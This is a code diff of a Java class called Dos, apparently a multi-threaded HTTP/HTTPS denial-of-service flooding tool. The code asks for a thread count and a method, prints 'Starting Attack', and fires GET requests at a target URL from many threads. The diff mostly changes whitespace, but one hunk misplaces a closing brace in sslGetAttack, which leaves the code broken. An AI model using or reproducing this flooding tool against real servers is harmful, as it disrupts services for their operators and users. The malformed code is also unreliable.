@@ -74,6 +74,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
+
         System.out.print("method: ");
         String option = in.nextLine();
         int ioption = 3;
@@ -94,7 +95,6 @@ public class Dos implements Runnable {
 
         Thread.sleep(7340);
 
-
         System.out.println("Starting Attack");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
@@ -111,7 +111,7 @@ public class Dos implements Runnable {
 
             }
         }
-        System.out.println("Main Thread ended");
+        System.out.println( "Main Thread ended" );
     }
 
     private void checkConnection(String url) throws Exception {
@@ -185,13 +185,12 @@ public class Dos implements Runnable {
         int responseCode = con.getResponseCode();
         System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
     }
-
-    private void sslGetAttack(String url) throws Exception {
+        private void sslGetAttack(String url) throws Exception {
         URL obj = new URL(url);
         HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
         con.setRequestProperty("User-Agent", USER_AGENT);
-
+    }
         int responseCode = con.getResponseCode();
         System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
     }
